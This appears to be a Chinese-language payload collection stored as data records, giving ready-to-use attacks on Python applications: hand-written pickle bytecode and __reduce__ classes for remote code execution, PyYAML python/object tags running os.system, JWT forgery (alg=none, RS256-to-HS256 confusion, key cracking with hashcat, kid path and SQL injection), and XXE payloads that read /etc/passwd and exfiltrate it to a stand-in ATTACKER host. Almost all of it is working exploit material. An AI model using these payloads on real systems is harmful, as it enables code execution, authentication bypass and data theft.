payloads.title: Python 反序列化: pickle 手工字节码
payloads.description: 不依赖目标类时用 reduce 直接调 os.system；pickle 只要能被 load 就是 RCE。
payloads.body:
# 最简 RCE
cos
system
(S'id'
tR.
# 执行并回显
cbuiltins
eval
(S"__import__('os').popen('id').read()"
tR.
# 用 python 生成
import pickle,os
class E:
    def __reduce__(self): return (os.system,('id',))
print(pickle.dumps(E()))
# 兼容 protocol 2 的字节
pickle.dumps(E(), protocol=2)
# 常见入口：cookie、session、缓存、redis、celery、ML 模型（torch.load/np.load allow_pickle）

payloads.title: Python 反序列化: yaml.load / unsafe
payloads.description: PyYAML < 6 的 yaml.load 无 Loader 时可构造 python/object 标签。
payloads.body:
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:os.system ["id"]
!!python/object/apply:builtins.eval ["__import__('os').popen('id').read()"]
# 文件落地
!!python/object/apply:io.open ["/tmp/x","w"]
# 探测：SafeLoader 会抛 ConstructorError，FullLoader 不会执行 system
# 同类：jsonpickle.decode、dill、marshal

payloads.title: Python JWT: 算法混淆与密钥爆破
payloads.description: PyJWT 老版本接受 alg=none；RS256 公钥泄露时可改成 HS256 用公钥当密钥。
payloads.body:
# 1) alg=none
{"alg":"none","typ":"JWT"} + {"user":"admin","role":"admin"} + ""
# 2) RS256 → HS256（用泄露的公钥当 HMAC 密钥）
jwt.encode({"user":"admin"}, open('pub.pem').read(), algorithm='HS256')
# 3) 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt
python3 jwt_tool.py <JWT> -C -d rockyou.txt
# 4) kid 注入
{"alg":"HS256","kid":"../../../../dev/null"}      # 空密钥
{"alg":"HS256","kid":"/etc/passwd"}               # 读文件当密钥
{"alg":"HS256","kid":"x' union select 'k'-- -"}   # SQL 注入
# 5) jku / x5u 指向自己的 JWKS

payloads.title: Python XXE: lxml / xml.etree
payloads.description: lxml resolve_entities=True 时可用外部实体；xml.etree 默认不解析实体但可被 xxe 库影响。
payloads.body:
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
# 盲外带
<!DOCTYPE r [<!ENTITY % f SYSTEM "http://ATTACKER/e.dtd">%f;]>
# e.dtd
<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY % c SYSTEM 'http://ATTACKER/?%a;'>">%b;%c;
# 常见受影响解析
lxml.etree.parse(..., resolve_entities=True)
xmltodict.parse  /  defusedxml 缺失的 xml.dom.minidom
